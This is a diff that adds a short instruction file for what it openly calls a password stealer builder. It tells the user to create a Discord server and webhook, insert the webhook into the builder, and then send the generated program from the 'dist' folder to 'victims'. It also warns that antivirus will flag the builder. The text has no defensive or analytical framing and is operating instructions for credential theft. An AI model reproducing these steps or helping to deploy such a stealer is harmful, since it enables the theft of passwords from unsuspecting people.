@@ -1,0 +1,6 @@
+Anti virus may interfere with the program as when you run it, it is building a password stealer program for you to send to your victims, and antivirus thinks the program is malicious.
+
+Step 1: Create a discord server
+Step 2: create a webhook
+Step 3: open the program and insert your webhook.
+Step 4: give it a minute, it will create the program and make a "dist" folder in which the program to send to people will be located in. and then it will be ready to send to people
